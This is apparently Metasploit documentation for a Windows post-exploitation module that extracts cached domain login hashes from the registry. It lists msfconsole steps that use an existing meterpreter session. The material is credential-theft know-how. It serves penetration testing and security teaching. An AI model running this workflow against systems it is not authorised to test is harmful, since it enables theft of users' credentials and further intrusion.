## Vulnerable Application

This module uses the registry to extract the stored domain hashes that have been cached as a result of a GPO setting. The default setting on Windows is to store the last ten successful logins.

## Verification Steps
  1. Start msfconsole
  2. Get meterpreter session
  3. Do: ```use post/windows/gather/cachedump```
  4. Do: ```set SESSION <session id>```
  5. Do: ```run```

## Options

  **SESSION**

  The session to run this module on.
